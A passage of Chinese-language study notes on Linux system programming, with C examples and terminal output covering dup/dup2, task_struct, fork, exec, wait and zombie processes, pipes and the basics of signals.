fprintf(stderr, &quot;dirwalk: name %s %s too long &quot;,dir, dp-&gt;d_name); else &#123; sprintf(name, &quot;%s/%s&quot;, dir, dp-&gt;d_name);(*fcn)(name); &#125;\t&#125;\tclosedir(dfd);&#125;/* fsize: print the size and name of file &quot;name&quot; */void fsize(char *name)&#123;\tstruct stat stbuf;\tif (stat(name, &amp;stbuf) == -1) &#123; fprintf(stderr, &quot;fsize: can&#x27;t access%s &quot;, name); return;\t&#125;\tif ((stbuf.st_mode &amp; S_IFMT) == S_IFDIR) dirwalk(name, fsize);\tprintf(&quot;%8ld %s &quot;, stbuf.st_size, name);&#125;int main(int argc, char **argv)a&#123;\tif (argc == 1) /* default: current directory*/ fsize(&quot;.&quot;);\telse while (--argc &gt; 0) fsize(*++argv); return 0;&#125; 输出 123456789dqx@resmile-2:/mnt/f/0xC0de/elf/C$ ./q.elf 12288 ./.q.c.swp 122 ./makefile 1223 ./q.c 17168 ./q.elf 3256 ./q.o 0 ./q.txt 512 .dqx@resmile-2:/mnt/f/0xC0de/elf/C$ dup和dup2函数参考链接 https://blog.nowcoder.net/n/1337e6e77d2f402b851f86795b32b0ad https://blog.csdn.net/silent123go/article/details/71108501 123456789101112#include &lt;unistd.h&gt;int dup(int oldfd);int dup2(int oldfd, int newfd);oldfd: 原来的文件描述符newfd：复制成的新的文件描述符成功：将oldfd复制一份然后给newfd, 两个文件描述符指向oldfd失败：返回-1, 设置errno值它的意思是将oldfd重定向至newfd dup和dup2都可用来复制一个现存的文件描述符，使两个文件描述符指向同一个file结构体。 如果两个文件描述符指向同一个file结构体，读写位置只保存一份在file结构体中，并且file结构体的引用计数是2 当调用dup函数时，内核在进程中创建一个新的文件描述符，此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。dup2和dup的区别就是可以用newfd参数指定新描述符的数值， 如果newfd已经打开，则先将其关闭。 如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。 dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。 12345678910111213141516171819202122232425#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(void)&#123; int fd, fd_tmp; char msg[] = &quot;This is a test &quot;; fd = open(&quot;somefile&quot;, O_RDWR|O_CREAT,S_IRUSR|S_IWUSR); if(fd&lt;0) &#123; perror(&quot;open&quot;); exit(1); &#125; fd_tmp = dup(STDOUT_FILENO); //stdout=&#123;tmp,1&#125; ,file=&#123;fd&#125; dup2(fd, STDOUT_FILENO); //stdout=&#123;tmp&#125; ,file=&#123;fd,1&#125; close(fd); //stdout=&#123;tmp&#125; ,file=&#123;1&#125; write(STDOUT_FILENO, msg, strlen(msg)); //往1==文件里面写入 dup2(fd_tmp, STDOUT_FILENO); //stdout=&#123;tmp,1&#125; ,file=&#123;&#125; write(STDOUT_FILENO, msg, strlen(msg)); //往终端输出 close(fd_tmp); //stdout=&#123;1&#125; ,file=&#123;&#125; return 0;&#125; 小结ext文件系统主要介绍了的文件描述符对应的file结构体,然后简单提及类其中几个重要的成员 dup&#x2F;dup2主要讲了一个文件描述符号的复制,也就是备份了一个,file结构体的引用计数++ 进程每个进程在内核中都有一个进程控制块（PCB）来维护进程相关的信息 Linux内核的进程控制块是task_struct结构体 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114struct task_struct &#123; volatile long state; //说明了该进程是否可以执行,还是可中断等信息 unsigned long flags; //Flage 是进程号,在调用fork()时给出 int sigpending; //进程上是否有待处理的信号 mm_segment_t addr_limit; //进程地址空间,区分内核进程与普通进程在内存存放的位置不同 //0-0xBFFFFFFF for user-thead //0-0xFFFFFFFF for kernel-thread //调度标志,表示该进程是否需要重新调度,若非0,则当从内核态返回到用户态,会发生调度 volatile long need_resched; int lock_depth; //锁深度 long nice; //进程的基本时间片 //进程的调度策略,有三种,实时进程:SCHED_FIFO,SCHED_RR, 分时进程:SCHED_OTHER unsigned long policy; struct mm_struct *mm; //进程内存管理信息 int processor; //若进程不在任何CPU上运行, cpus_runnable 的值是0，否则是1 这个值在运行队列被锁时更新 unsigned long cpus_runnable, cpus_allowed; struct list_head run_list; //指向运行队列的指针 unsigned long sleep_time; //进程的睡眠时间 //用于将系统中所有的进程连成一个双向循环链表, 其根是init_task struct task_struct *next_task, *prev_task; struct mm_struct *active_mm; struct list_head local_pages; //指向本地页面 unsigned int allocation_order, nr_local_pages; struct linux_binfmt *binfmt; //进程所运行的可执行文件的格式 int exit_code, exit_signal; int pdeath_signal; //父进程终止时向子进程发送的信号 unsigned long personality; //Linux可以运行由其他UNIX操作系统生成的符合iBCS2标准的程序 int did_exec:1; pid_t pid; //进程标识符,用来代表一个进程,一个非负整数 pid_t pgrp; //进程组标识,表示进程所属的进程组 pid_t tty_old_pgrp; //进程控制终端所在的组标识 pid_t session; //进程的会话标识 pid_t tgid; int leader; //表示进程是否为会话主管 struct task_struct *p_opptr,*p_pptr,*p_cptr,*p_ysptr,*p_osptr; struct list_head thread_group; //线程链表 struct task_struct *pidhash_next; //用于将进程链入HASH表 struct task_struct **pidhash_pprev; wait_queue_head_t wait_chldexit; //供wait4()使用 struct completion *vfork_done; //供vfork() 使用 unsigned long rt_priority; //实时优先级，用它计算实时进程调度时的weight值 //it_real_value，it_real_incr用于REAL定时器，单位为jiffies, 系统根据it_real_value //设置定时器的第一个终止时间. 在定时器到期时，向进程发送SIGALRM信号，同时根据 //it_real_incr重置终止时间，it_prof_value，it_prof_incr用于Profile定时器，单位为jiffies。 //当进程运行时，不管在何种状态下，每个tick都使it_prof_value值减一，当减到0时，向进程发送 //信号SIGPROF，并根据it_prof_incr重置时间. //it_virt_value，it_virt_value用于Virtual定时器，单位为jiffies。当进程运行时，不管在何种 //状态下，每个tick都使it_virt_value值减一当减到0时，向进程发送信号SIGVTALRM，根据 //it_virt_incr重置初值。 unsigned long it_real_value, it_prof_value, it_virt_value; unsigned long it_real_incr, it_prof_incr, it_virt_value; struct timer_list real_timer; //指向实时定时器的指针 struct tms times; //记录进程消耗的时间 unsigned long start_time; //进程创建的时间 //记录进程在每个CPU上所消耗的用户态时间和核心态时间 long per_cpu_utime[NR_CPUS], per_cpu_stime[NR_CPUS]; //内存缺页和交换信息: //min_flt, maj_flt累计进程的次缺页数（Copy on　Write页和匿名页）和主缺页数（从映射文件或交换 //设备读入的页面数）； nswap记录进程累计换出的页面数，即写到交换设备上的页面数。 //cmin_flt, cmaj_flt, cnswap记录本进程为祖先的所有子孙进程的累计次缺页数，主缺页数和换出页面数。 //在父进程回收终止的子进程时，父进程会将子进程的这些信息累计到自己结构的这些域中 unsigned long min_flt, maj_flt, nswap, cmin_flt, cmaj_flt, cnswap; int swappable:1; //表示进程的虚拟地址空间是否允许换出 //进程认证信息 //uid,gid为运行该进程的用户的用户标识符和组标识符，通常是进程创建者的uid，gid //euid，egid为有效uid,gid //fsuid，fsgid为文件系统uid,gid，这两个ID号通常与有效uid,gid相等，在检查对于文件 //系统的访问权限时使用他们。 //suid，sgid为备份uid,gid uid_t uid,euid,suid,fsuid; gid_t gid,egid,sgid,fsgid; int ngroups; //记录进程在多少个用户组中 gid_t groups[NGROUPS]; //记录进程所在的组 //进程的权能，分别是有效位集合，继承位集合，允许位集合 kernel_cap_t cap_effective, cap_inheritable, cap_permitted; int keep_capabilities:1; struct user_struct *user; struct rlimit rlim[RLIM_NLIMITS]; //与进程相关的资源限制信息 unsigned short used_math; //是否使用FPU char comm[16]; //进程正在运行的可执行文件名 //文件系统信息 int link_count, total_link_count; //NULL if no tty 进程所在的控制终端，如果不需要控制终端，则该指针为空 struct tty_struct *tty; unsigned int locks; //进程间通信信息 struct sem_undo *semundo; //进程在信号灯上的所有undo操作 struct sem_queue *semsleeping; //当进程因为信号灯操作而挂起时，他在该队列中记录等待的操作 //进程的CPU状态，切换时，要保存到停止进程的task_struct中 struct thread_struct thread; //文件系统信息 struct fs_struct *fs; //打开文件信息 struct files_struct *files; //信号处理函数 spinlock_t sigmask_lock; struct signal_struct *sig; //信号处理函数 sigset_t blocked; //进程当前要阻塞的信号，每个信号对应一位 struct sigpending pending; //进程上是否有待处理的信号 unsigned long sas_ss_sp; size_t sas_ss_size; int (*notifier)(void *priv); void *notifier_data; sigset_t *notifier_mask; u32 parent_exec_id; u32 self_exec_id; spinlock_t alloc_lock; void *journal_info;&#125;; 导入fork的作用是根据一个现有的进程复制出一个新进程， 原来的进程称为父进程（Parent Process）， 新进程称为子进程（ChildProcess) 在Shell下输入命令可以运行一个程序，是因为Shell进程在读取用户输入的命令之后会 调用fork复制出一个新的Shell进程，然后新的Shell进程调用exec执行新的程序 exec系统调用执行新程序时会把命令行参数和环境变量表传递给main函数 和命令行参数argv类似，环境变量表也是一组字符串 打印环境变量 123456789#include &lt;stdio.h&gt;int main(void)&#123;\textern char **environ;\tint i;\tfor(i=0; environ[i]!=NULL; i++) printf(&quot;%s &quot;, environ[i]);\treturn 0;&#125; 由于父进程在调用fork创建子进程时会把自己的环境变量表也复制给子进程， 所以a.out打印的环境变量和Shell进程的环境变量是相同的 12345678910dqx@dqx:/mnt/f/0xC0de/elf/C$ ./q.elfSHELL=/bin/bashWSL_DISTRO_NAME=DebianWT_SESSION=8546ea82-2f08-4619-955e-ad9e217bac0eNAME=resmile-2PWD=/mnt/f/0xC0de/elf/CLOGNAME=dqxHOME=/home/dqxLANG=en_US.UTF-8WSL_INTEROP=/run/WSL/14_interop getenv函数查看环境变量 12#include &lt;stdlib.h&gt;char *getenv(const char *name); getenv的返回值是指向value的指针，若未找到则为NULL 修改环境变量可以用以下函数 123#include &lt;stdlib.h&gt;int setenv(const char *name, const char *value, int rewrite);void unsetenv(const char *name); putenv和setenv函数若成功则返回为0，若出错则返回非0 etenv将环境变量name的值设置为value。如果已存在环境变量name， 那么 若rewrite非0，则覆盖原来的定义； 若rewrite为0，则不覆盖原来的定义，也不返回错误。 unsetenv删除name的定义。即使name没有定义也不返回错误 修改环境变量,运行不是很成功 123456789#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(void)&#123; printf(&quot;PATH=%s &quot;, getenv(&quot;PATH&quot;)); setenv(&quot;PATH&quot;, &quot;hello&quot;, 1); printf(&quot;PATH=%s &quot;, getenv(&quot;PATH&quot;)); return 0;&#125; Shell进程的环境变量PATH传给了a.out， 然后a.out修改了PATH的值，在a.out中能打印出修改后的值， 但在Shell进程中PATH的值没变。 父进程在创建子进程时会复制一份环境变量给子进程， 但此后二者的环境变量互不影响 进程控制fork函数123#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;pid_t fork(void); fork调用失败则返回-1，调用成功的返回值见下面的解释。我们通过一个例子来理解fork是怎样创建新进程的 fork会产生一个进程 复制一份自己,产生一份新的自己.原来的自己依然存在 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123;\tpid_t pid;\tchar *message=NULL;\tint n=0;\tpid = fork();\tif (pid &lt; 0) &#123; perror(&quot;fork failed&quot;); exit(1);\t&#125;\tif (pid == 0) //child\t&#123; printf(&quot;C-0 %08X &quot;,getpid()); pid = fork(); if(pid&gt;0) &#123; printf(&quot;C-0 %08X &quot;,getpid()); &#125; else//0 &#123; printf(&quot;C-C %08X &quot;,getpid()); &#125; &#125;\telse // pid&gt;0 father\t&#123; printf(&quot;F-0 %08X &quot;,getpid()); pid = fork(); if(pid&gt;0) &#123; printf(&quot;F-0 %08X &quot;,getpid()); &#125; else &#123; printf(&quot;F-C %08X &quot;,getpid()); &#125;\t&#125;\treturn 0;&#125; 运行 12345678dqx@resmile-2:/mnt/f/0xC0de/elf/C$ ./qF-0 00000090C-0 00000091F-0 00000090F-C 00000092C-0 00000091C-C 00000093dqx@resmile-2:/mnt/f/0xC0de/elf/C$ 这个程序是在Shell下运行的，因此Shell进程是父进程的父进程。 父进程运行时Shell进程处于等待状态，当父进程终止时Shell进程认为命令执行结束了，于是打印Shell提示符， 而事实上子进程这时还没结束，所以子进程的消息打印到了Shell提示符后面。 最后光标停在This is the child的下一行，这时用户仍然可以敲命令， 即使命令不是紧跟在提示符后面，Shell也能正确读取 子进程中fork的返回值是0，而父进程中fork的返回值则是子进程的id 这样当fork函数返回后，程序员可以根据返回值的不同让父进程和子进程执行不同的代码 调用getppid函数得到父进程的id 用getpid可以得到自己的进程id exec函数fork创建子进程 相当于复制,但有可能执行不同的代码分支 exec可能类似于创造一个不同的进程 123456789101112131415161718192021222324#include &lt;unistd.h&gt;int execve(const char *path, char *const argv[], char *const envp[]);int execle(const char *path, const char *arg, ..., char *const envp[]);int execl(const char *path, const char *arg, ...);int execv(const char *path, char *const argv[]);int execlp(const char *file, const char *arg, ...);int execvp(const char *file, char *const argv[]);//举例char *const ps_argv[] =&#123;&quot;ps&quot;, &quot;-o&quot;,&quot;pid,ppid,pgrp,session,tpgid,comm&quot;, NULL&#125;;char *const ps_envp[] =&#123;&quot;PATH=/bin:/usr/bin&quot;, &quot;TERM=console&quot;,NULL&#125;;execl(&quot;/bin/ps&quot;, &quot;ps&quot;, &quot;-o&quot;, &quot;pid,ppid,pgrp,session,tpgid,comm&quot;,NULL);execle(&quot;/bin/ps&quot;, &quot;ps&quot;, &quot;-o&quot;, &quot;pid,ppid,pgrp,session,tpgid,comm&quot;,NULL, ps_envp);execv(&quot;/bin/ps&quot;, ps_argv);execve(&quot;/bin/ps&quot;, ps_argv, ps_envp);execlp(&quot;ps&quot;, &quot;ps&quot;, &quot;-o&quot;, &quot;pid,ppid,pgrp,session,tpgid,comm&quot;,NULL);execvp(&quot;ps&quot;, ps_argv); 这些函数如果调用成功则加载新的程序从启动代码开始执行，不再返回 如果调用出错则返回-1，所以exec函数只有出错的返回值而没有成功的返回值 不带字母p（表示path）的exec函数第一个参数必须是程序的相对路径或绝对路径 对于带字母p的函数, 如果参数中包含&#x2F;，则将其视为路径名 否则视为不带路径的程序名，在PATH环境变量的目录列表中搜索这个程序。 带有字母l（表示list）的exec函数要求将新程序的每个命令行参数都当作一个参数传给它， 命令行参数的个数是可变的，因此函数原型中有…,最后一个可变参数应该是NULL 对于带有字母v（表示vector）的函数，则应该先构造一个指向各参数的指针数组， 然后将该数组的首地址当作参数传给它，数组中的最后一个指针也应该是NULL， 就像main函数的argv参数或者环境变量表一样 对于以e（表示environment）结尾的exec函数，可以把一份新的环境变量表传给它， 其他exec函数仍使用当前的环境变量表执行新程序 只有execve是真正的系统调用，其它五个函数最终都调用execve 123456789#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(void)&#123;\texeclp(&quot;ps&quot;, &quot;ps&quot;, &quot;-o&quot;,&quot;pid,ppid,pgrp,session,tpgid,comm&quot;, NULL);\tperror(&quot;exec ps&quot;);\texit(1);&#125; 显示 123 PID PPID PGRP SESS TPGID COMMAND19205 17176 19205 19205 20817 bash20817 19205 20817 19205 20817 ps 12345678910111213141516171819202122232425/* wrapper.c */#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char *argv[])&#123;\tint fd;\tif (argc != 2) &#123; fputs(&quot;usage: wrapper file &quot;, stderr); exit(1);\t&#125;\tfd = open(argv[1], O_RDONLY);\tif(fd&lt;0) &#123; perror(&quot;open&quot;); exit(1);\t&#125;\tdup2(fd, STDIN_FILENO);\tclose(fd);\texecl(&quot;./upper.elf&quot;, &quot;upper.elf&quot;, NULL);\tperror(&quot;exec ./upper.elf&quot;);\texit(1);&#125; 输入 .&#x2F;q.elf hello.txt 显示 DQX IS A GOD BOY,但是文本内容不变 wait和waitpid一个进程在终止时会关闭所有文件描述符，释放在用户空间分配的内存， 但它的PCB还保留着，内核在其中保存了一些信息：如果是正常终止则保存着退出状态， 如果是异常终止则保存着导致该进程终止的信号是哪个。 这个进程的父进程可以调用wait或waitpid获取这些信息，然后彻底清除掉这个进程。 我们知道一个进程的退出状态可以在Shell中用特殊变量$? 查看，因为Shell是它的父进程，当它终止时Shell调用wait或waitpid得到它的退出状态 同时彻底清除掉这个进程。 如果一个进程已经终止，但是它的父进程尚未调用wait或waitpid对它进行清理 这时的进程状态称为僵尸（Zombie）进程。 任何进程在刚终止时都是僵尸进程，正常情况下， 僵尸进程都立刻被父进程清理了，为了观察到僵尸进程， 我们自己写一个不正常的程序，父进程fork出子进程，子进程终止，而父进程既不终止也不调用wait清理子进程 僵尸进程 12345678910111213141516171819202122#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(void)&#123;\tint x=0; pid_t pid=fork();\tx=getpid();\tif(pid&lt;0) &#123; perror(&quot;fork&quot;); exit(1);\t&#125;\tif(pid&gt;0) /* parent */\t&#123; printf(&quot;F %08d &quot;,x); while(1);\t&#125;\tprintf(&quot;S %08d&quot;,x);\t/* child */\treturn 0;&#125; 执行 12./q.elf &amp; 表示elf在后台执行,不显示到前台ps u 显示执行的程序 前台运行一下 开放另外一个终端, 父进程存在,子进程死亡,父进程没有清理子进程,子进程此刻叫僵尸进程ps:僵尸进程就是没有死透彻的进程 也就是子进程先死,未做特殊处理,父进程不会清理子进程 在父进程未退出的情况下,始终会有父进程和僵尸子进程存在 利用ps u 查看僵尸进程.他的STAT是Z状态 如果父进程先死(进程号消失的那种死亡), 子进程还存在(可能是僵尸进程), 即使父进程没有清理子进程,父进程也会变为init进程,进程id是1,然后父进程等待子进程结束,然后清理 僵尸进程是不能用kill命令清除掉的，因为kill命令只是用来终止进程的， 而僵尸进程已经终止了 接下来避免僵尸进程 wait和waitpid函数的原型是 1234#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;pid_t wait(int *status);pid_t waitpid(pid_t pid, int *status, int options); 父进程调用wait或waitpid时可能会： 阻塞（如果它的所有子进程都还在运行） 带子进程的终止信息立即返回（如果一个子进程已终止，正等待父进程读取其终止信息) 出错立即返回（如果它没有任何子进程） 这两个函数的区别是： 如果父进程的所有子进程都还在运行，调用wait将使父进程阻塞，而调用waitpid时如果在options参数中 指定WNOHANG可以使父进程不阻塞而立即返回0。 wait等待第一个终止的子进程，而waitpid可以通过pid参数指定等待哪一个子进程 可见，调用wait和waitpid不仅可以获得子进程的终止信息，还可以使父进程阻塞等待子进程终 止，起到进程间同步的作用。如果参数status不是空指针，则子进程的终止信息通过这个参数 传出，如果只是为了同步而不关心子进程的终止信息，可以将status参数指定为NULL 1234567891011121314151617181920212223242526272829303132333435#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123;\tpid_t pid;\tpid = fork();\tif (pid &lt; 0) &#123; perror(&quot;fork failed&quot;); exit(1);\t&#125;\tif (pid == 0) //son\t&#123; int i; for (i = 3; i &gt; 0; i--) &#123; printf(&quot;This is the child &quot;); sleep(1); &#125; exit(3);\t&#125; else //father\t&#123; int stat_val; waitpid(pid, &amp;stat_val, 0);//父进程等待子进程,输出信息到stat_val if (WIFEXITED(stat_val)) printf(&quot;Child exited with code%d &quot;, WEXITSTATUS(stat_val)); else if (WIFSIGNALED(stat_val)) printf(&quot;Child terminated abnormally, signal %d &quot;, WTERMSIG(stat_val));\t&#125;\treturn 0;&#125; 输出 123456dqx@dqx-virtual-machine:~/桌面/C/q1$ ./q.elf This is the childThis is the childThis is the childChild exited with code3dqx@dqx-virtual-machine:~/桌面/C/q1$ 可以看到,main函数被阻塞了 子进程的终止信息在一个int中包含了多个字段，用宏定义可以取出其中的每个字段： 如果子进程是正常终止的， WIFEXITED取出的字段值非零，WEXITSTATUS取出的字段值就是子进程的退出状态； 如果子进程是收到信号而异常终止的， WIFSIGNALED取出的字段值非零，WTERMSIG取出的字段值就是信号的编号 进程间通信（IPC:InterProcess Communication） 每个进程各自有不同的用户地址空间，任何一个进程的全局变量在另一个进程中都看不到， 所以进程之间要交换数据必须通过内核，在内核中开辟一块缓冲区， 进程1把数据从用户空间拷到内核缓冲区， 进程2再从内核缓冲区把数据读走，内核提供的这种机制称为进程间通信 管道管道是一种最基本的IPC机制，由pipe函数创建 12#include &lt;unistd.h&gt;int pipe(int filedes[2]); 调用pipe函数时在内核中开辟一块缓冲区（称为管道）用于通信， 它有一个读端一个写端， 然后通过filedes参数传出给用户程序两个文件描述符， filedes[0]指向管道的读端， filedes[1]指向管道的写端 记忆方式就是读取和写入 所以管道在用户程序看起来就像一个打开的文件，通过read(filedes[0]);或者write(filedes[1]); 向这个文件读写数据其实是在读写内核缓冲区。 pipe函数调用成功返回0，调用失败返回-1。 开辟了管道之后如何实现两个进程间的通信呢？ 比如可以按下面的步骤通信 父进程调用pipe开辟管道，得到两个文件描述符指向管道的两端。 父进程调用fork创建子进程，那么子进程也有两个文件描述符指向同一管道。 父进程关闭管道读端，子进程关闭管道写端。父进程可以往管道里写，子进程可以从管道里读，管道是用环形队列实现的，数据从写端流入从读端流出，这样就实现了进程间通信 ps: 我读的时候,你只能写?我写,你只能读取? 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#define MAXLINE 80int main(void)&#123;\tint n;\tint fd[2];\tpid_t pid;\tchar line[MAXLINE];\tif (pipe(fd) &lt; 0) // open pipe\t&#123; perror(&quot;pipe&quot;); exit(1);\t&#125;\tif ((pid = fork()) &lt; 0) //begin fork\t&#123; perror(&quot;fork&quot;); exit(1);\t&#125;\tif (pid &gt; 0) /* parent */\t&#123; puts(&quot;Father Begin Read&quot;); close(fd[1]);//close write begin read n = read(fd[0], line, MAXLINE);//貌似这里会有阻塞 puts(&quot;Father Read Down&quot;); write(STDOUT_FILENO, line, n);//write to stdout\t&#125; else /* child */\t&#123; puts(&quot;Child Begin Write&quot;); close(fd[0]);//clsoe read,begin write write(fd[1], &quot;hello world &quot;, 12); puts(&quot;Child Write Down&quot;); //wait(NULL);\t&#125;\treturn 0;&#125; 使用管道有一些限制 1). 两个进程通过一个管道只能实现单向通信，比如上面的例子，父进程写子进程读 2). 管道的读写端通过打开的文件描述符来传递，因此要通信的两个进程必须从它们的公共祖 先那里继承管道文件描述符。上面的例子是父进程把文件描述符传给子进程之后父子进程 之间通信，也可以父进程fork两次，把文件描述符传给两个子进程，然后两个子进程之间 通信，总之需要通过fork传递文件描述符使两个进程都能访问同一管道，它们才能通信。 不是随随便便一个fd就可以,fd必须来自相同的pipe(fd)经过注册 下面这个子进程之间的管道访问，不知道有没有写对 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#define MAXLINE 80int main(void)&#123;\tint n;\tint fd[2];\tpid_t pid;\tchar line[MAXLINE];\tif (pipe(fd) &lt; 0) // open pipe\t&#123; perror(&quot;pipe&quot;); exit(1);\t&#125;\tpid = fork();\tif (pid &lt; 0) // fork wrong\t&#123; perror(&quot;fork&quot;); exit(1);\t&#125;\tif (pid &gt; 0) /* parent */\t&#123; pid=fork();//又创建一个?? if(pid==0)//child-2 &#123; close(fd[0]);//clsoe read,begin write puts(&quot;Write Down&quot;); write(fd[1], &quot;pipe:hello world &quot;, 17); &#125; else //father &#123; wait(NULL);//得等待另外一个写进程完毕吗? puts(&quot;Last over&quot;); &#125;\t&#125; else /* child-1 */\t&#123; close(fd[1]);//close write begin read n = read(fd[0], line, MAXLINE); puts(&quot;Read Down&quot;); write(STDOUT_FILENO, line, n);//write to stdout\t&#125;\treturn 0;&#125; 输出 123456dqx@D0g3:~/桌面/C$ ./q.elfWrite DownRead Downpipe:hello worldLast overdqx@D0g3:~/桌面/C$ 感觉还行 使用管道需要注意以下4种特殊情况（假设都是阻塞I&#x2F;O操作，没有设置O_NONBLOCK标志）： 如果所有指向管道写端的文件描述符都关闭了（管道写端的引用计数等于0），而仍然有进程从管道的读端读数据，那么管道中剩余的数据都被读取后，再次read会返回0，就像读到文件末尾一样。 如果有指向管道写端的文件描述符没关闭（管道写端的引用计数大于0），而持有管道写端的进程也没有向管道中写数据，这时有进程从管道读端读数据，那么管道中剩余的数据都被读取后，再次read会阻塞，直到管道中有数据可读了才读取数据并返回。 如果所有指向管道读端的文件描述符都关闭了（管道读端的引用计数等于0），这时有进程向管道的写端write，那么该进程会收到信号SIGPIPE，通常会导致进程异常终止。在第 33 章 信号会讲到怎样使SIGPIPE信号不终止进程。 如果有指向管道读端的文件描述符没关闭（管道读端的引用计数大于0），而持有管道读端的进程也没有从管道中读数据，这时有进程向管道写端写数据，那么在管道被写满时再次write会阻塞，直到管道中有空位置了才写入数据并返回。管道的这四种特殊情况具有普遍意义。在第 37 章 socket编程要讲的TCP socket也具有管道的这些特性 其它IPC机制进程间通信必须通过内核提供的通道，如果要互相通信的几个进程没有从公共祖先那里继承文件描述符， 它们怎么通信呢？ 内核提供一条通道简单，问题是如何标识这条通道才能使各进程都可以访问它？ 文件系统中的路径名是全局的，各进程都可以访问， 因此可以用文件系统中的路径名来标识一个IPC通道。 FIFO可以用mkfifo命令创建一个FIFO文件 各进程可以打开这个文件进行read&#x2F;write，实际上是在读写内核通道实现了进程间通信，实现了进程间通信 SocketSocket是目前最广泛,使用的IPC机制，到后面讲socket编程时再详细介绍 Socket和FIFO的原理类似，也需要一个特殊的socket文件来标识内核中的通道， 例如&#x2F;var&#x2F;run目录下有很多系统服务的socket文件 总结如下导入部分,主要讲了进程块结构体的东西 进程控制主要讲了fork和exec,fork是继承形的复制进程,exec是完全新的开辟一个进程 进程之间的通信主要讲了pipi的管道,其它的没有过多的去讲 信号Ctrl-C产生SIGINT终止信号 Ctrl-\\产生SIGQUIT信号,终止进程并且CoreDump Ctrl-Z产生SIGTSTP信号,可使前台进程停止 信号的基本概念 每个信号都有一个编号和一个宏定义名称，这些宏定义可以在signal.h中找到 编号34以上的是实时信号，本章只讨论编号34以下的信号，不讨论实时信号 产生信号的条件主要有 用户在终端按下某些键时(人为物理发送) 比如除以0的指令,访问了非法内存地址(内部异常) 一个进程调用kill函数可以发送信号给另一个进程(函数调用) 可以用kill命令发送信号给某个进程，如果不明确指定信号则发送SIGTERM信号，默认处理动作是终止进程。 指令调用 例如闹钟超时产生SIGALRM信号，向读端已关闭的管道写数据时产生SIGPIPE信号(函数浅调用) 如果不想按默认动作处理信号，用户程序可以调用sigaction函数告诉内核如何处理某种信号 可选的处理动作有以下三种： 忽略此信号。 执行该信号的默认处理动作。 提供一个信号处理函数，要求内核在处理该信号时切换到用户态执行这个处理函数，这种方式称为捕捉（Catch）一个信号。 产生信号1).通过终端按键产生信号 2). 调用系统函数向进程发信号 kill命令是调用kill函数实现的。 kill函数可以给一个指定的进程发送指定的信号。raise函数可以给当前进程发送指定的信号 (自己给自己发信号) 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;signal.h&gt;int kill(pid_t pid, int signo);int raise(int signo);#include &lt;stdlib.h&gt;void abort(void);1）int kill(pid_t pid, int sig); 功能：信号发送 参数：pid：指定进程 sig：要发送的信号 返回值：成功 0；失败 -1 2）int raise(int sig); 功能：进程向自己发送信号 参数：sig：信号 返回值：成功 0；失败 -1 3）unsigned int alarm(unsigned int seconds) 功能：在进程中设置一个定时器 参数：seconds：定时时间，单位为秒 返回值：如果调用此alarm()前，进程中已经设置了闹钟时间，则返回上一个闹钟时间的剩余时间，否则返回0。\t注意：一个进程只能有一个闹钟时间。如果在调用alarm时已设置过闹钟时间，则之前的闹钟时间被新值所代替 4）int pause(void); 功能：用于将调用进程挂起直到收到信号为止。5）void (*signal(int signum, void (*handler)(int)))(int); 或者： typedef void (*sighandler_t)(int); sighandler_t signal(int signum, sighandler_t handler); 功能：信号处理函数 参数：signum：要处理的信号//不能是SIGKILL和SIGSTOP handler：SIG_IGN：忽略该信号。 SIG_DFL：采用系统默认方式处理信号。 自定义的信号处理函数指针 返回值：成功：设置之前的信号处理方式；失败：SIG_ERR 6）void abort(void); 给自己发送异常终止信号，（6.SIGABRO）终止并产生core文件。 这两个函数都是成功返回0，错误返回-1。 abort函数使当前进程接收到SIGABRT信号而异常终止 就像exit函数一样，abort函数总是会成功的，所以没有返回值。 3).函数的浅调用 SIGPIPE是一种由软件条件产生的信号， 本节主要介绍alarm函数和SIGALRM信号 12#include &lt;unistd.h&gt;unsigned int alarm(unsigned int seconds); 调用alarm函数可以设定一个闹钟，也就是告诉内核在seconds秒之后给当前进程发SIGALRM信号， 该信号的默认处理动作是终止当前进程。 这个函数的返回值是0或者是以前设定的闹钟时间还余下的秒数。 打个比方，某人要小睡一觉，设定闹钟为30分钟之后响 20分钟后被人吵醒了，还想多睡一会儿，于是重新设定闹钟为15分钟之后响， 以前设定的闹钟时间还余下的时间就是10分钟。 如果seconds值为0，表示取消以前设定的闹钟 函数的返回值仍然是以前设定的闹钟时间还余下的秒数 下面这个例子看elf在1s种可以数数多少下 12345678910#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(void)&#123;\tint counter;\talarm(1);\tfor(counter=0; 1; counter++) printf(&quot;counter=%d &quot;, counter);\treturn 0;&#125; 阻塞信号导入以上我们讨论了信号产生（Generation）的各种原因， 而实际执行信号的处理动作称为信号递达（Delivery）， 信号从产生到递达之间的传递状态称为信号未决（Pending）。 进程可以选择阻塞（Block）某个信号。被阻塞的信号产生时将保持在未决状态， 直到进程解除对此信号的阻塞，才执行递达的动作。 注意，阻塞和忽略是不同的， 